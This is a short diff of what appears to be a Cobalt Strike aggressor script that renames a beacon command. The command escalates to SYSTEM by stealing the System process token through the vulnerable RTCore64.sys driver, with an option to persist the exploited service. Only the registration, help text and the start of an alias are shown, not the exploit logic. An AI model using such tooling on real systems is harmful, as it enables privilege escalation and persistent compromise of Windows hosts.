@@ -1,11 +1,11 @@
 # author @mooolight
 
 beacon_command_register(
-	"byovd-rtcore64-exploit-elevate2system", "Copy the token of the System.exe process' NT AUTHORITY\SYSTEM and transferring it to the target process by exploiting the vulnerable RTCore64.sys.",
+	"byovd-rtcore64-tokenconf-elevate2system", "Copy the token of the System.exe process' NT AUTHORITY\SYSTEM and transferring it to the target process by exploiting the vulnerable RTCore64.sys.",
 	"INFO:\nCopy the token of the System.exe process' NT AUTHORITY\SYSTEM and transferring it to the target process by exploiting the vulnerable RTCore64.sys.\n\n" .
 	"ARGUMENTS:\n[<targetProc>]: Target process for the action parameter.\n[<pers>]: Status whether the exploited service will persist or not.\n\n" .
-	"USAGE:\nbyovd-rtcore64-exploit <targetProc> <pers>\n\n".
-	"EXAMPLES:\nbyovd-rtcore64-exploit-elevate2system 8917 TRUE\n\n");
+	"USAGE:\nbyovd-rtcore64-tokenconf-elevate2system <targetProc> <pers>\n\n".
+	"EXAMPLES:\nbyovd-rtcore64-tokenconf-elevate2system 8917 TRUE\n\n");
 
 alias byovd-rtcore64-exploit {
     $bid = $1;
